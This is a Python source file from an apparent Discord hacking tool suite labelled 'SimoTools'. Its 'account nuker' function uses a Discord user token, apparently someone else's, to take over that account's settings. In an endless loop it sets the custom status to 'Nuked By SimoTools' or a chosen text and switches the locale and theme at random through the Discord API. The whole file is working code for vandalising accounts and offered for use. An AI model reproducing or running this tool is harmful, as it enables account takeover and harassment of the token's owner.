from colorama import Fore, Style
import os
import sys
import time
import requests
from itertools import cycle
import random
from utils.utils import clear, get_current_time, username, color, get_token_from_file
from utils.titles import title_discordaccnuker

def discordaccnuker():
    clear()
    print(getattr(Fore, color) + title_discordaccnuker + Style.RESET_ALL)
    
    try:
        # Get Discord token from file or input
        file_token = get_token_from_file()
        if file_token:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Token loaded from file{Style.RESET_ALL}")
            token = file_token
        else:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Token not found in file. Enter your Discord token{Style.RESET_ALL}")
            token = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Token > {Style.RESET_ALL}")
            
            # Check if user wants to return to main menu
            if token.upper() == 'B':
                clear()
                # Return to main menu
                script_dir = os.path.dirname(os.path.abspath(__file__))
                main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
                os.system(f'python "{main_path}"')
                sys.exit()
        
        # Get custom status
        custom_status_input = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Custom Status > {Style.RESET_ALL}")
        
        # Check if user wants to return to main menu
        if custom_status_input.upper() == 'B':
            clear()
            # Return to main menu
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        
        # Set up headers for API requests
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        
        # Verify token is valid
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Verifying token...{Style.RESET_ALL}")
        response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        
        if response.status_code != 200:
            print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Invalid token! Please check your token and try again.{Style.RESET_ALL}")
            time.sleep(2)
            discordaccnuker()  # Restart the function
            return
        
        print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Token verified successfully!{Style.RESET_ALL}")
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Starting account nuker...{Style.RESET_ALL}")
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Press Ctrl+C to stop the process{Style.RESET_ALL}")
        
        # Define statuses
        default_status = f"Nuked By SimoTools"
        custom_status = f"{custom_status_input} | SimoTools"
        
        # Create cycle for theme modes
        modes = cycle(["light", "dark"])
        
        # Main nuking loop
        try:
            nuking_count = 0
            while True:
                nuking_count += 1
                print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Nuking cycle #{nuking_count}{Style.RESET_ALL}")
                
                # Change to default status
                CustomStatus_default = {"custom_status": {"text": default_status}}
                try:
                    r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Status Discord: {Fore.WHITE}{default_status}{getattr(Fore, color)}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error {str(e)}{getattr(Fore, color)} Status Discord: {Fore.WHITE}{default_status}{getattr(Fore, color)}{Style.RESET_ALL}")
                
                # Change language and theme multiple times
                for _ in range(5):
                    try:
                        random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                        setting = {'locale': random_language}
                        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Language: {Fore.WHITE}{random_language}{getattr(Fore, color)}{Style.RESET_ALL}")
                    except:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Language: {Fore.WHITE}{random_language}{getattr(Fore, color)}{Style.RESET_ALL}")
                    
                    try:
                        theme = next(modes)
                        setting = {'theme': theme}
                        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Theme: {Fore.WHITE}{theme}{getattr(Fore, color)}{Style.RESET_ALL}")
                    except:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Theme: {Fore.WHITE}{theme}{getattr(Fore, color)}{Style.RESET_ALL}")
                    time.sleep(0.5)
                
                # Change to custom status
                CustomStatus_custom = {"custom_status": {"text": custom_status}}
                try:
                    r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Status Discord: {Fore.WHITE}{custom_status}{getattr(Fore, color)}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Status Discord: {Fore.WHITE}{custom_status}{getattr(Fore, color)}{Style.RESET_ALL}")
                
                # Change language and theme multiple times again
                for _ in range(5):
                    try:
                        random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                        setting = {'locale': random_language}
                        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Language: {Fore.WHITE}{random_language}{getattr(Fore, color)}{Style.RESET_ALL}")
                    except:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Language: {Fore.WHITE}{random_language}{getattr(Fore, color)}{Style.RESET_ALL}")
                    
                    try:
                        theme = next(modes)
                        setting = {'theme': theme}
                        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [+] Status: {Fore.WHITE}Changed{getattr(Fore, color)} Theme: {Fore.WHITE}{theme}{getattr(Fore, color)}{Style.RESET_ALL}")
                    except:
                        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Status: {Fore.WHITE}Error{getattr(Fore, color)} Theme: {Fore.WHITE}{theme}{getattr(Fore, color)}{Style.RESET_ALL}")
                    time.sleep(0.5)
                
                # Ask if user wants to continue after each cycle
                print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue nuking or type 'B' to return to menu...{Style.RESET_ALL}")
                user_input = input()
                
                if user_input.upper() == 'B':
                    clear()
                    # Return to main menu
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
                    os.system(f'python "{main_path}"')
                    sys.exit()
                
        except KeyboardInterrupt:
            print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Nuking process stopped by user.{Style.RESET_ALL}")
    
    except Exception as e:
        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{str(e)}{getattr(Fore, color)}{Style.RESET_ALL}")
    
    print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue or type 'B' to return to menu...{Style.RESET_ALL}")
    user_input = input()
    
    # Check if user wants to return to main menu
    if user_input.upper() == 'B':
        clear()
        # Return to main menu
        script_dir = os.path.dirname(os.path.abspath(__file__))
        main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
        os.system(f'python "{main_path}"')
        sys.exit()
    else:
        clear()
        # Return to main menu
        script_dir = os.path.dirname(os.path.abspath(__file__))
        main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
        os.system(f'python "{main_path}"')
        sys.exit()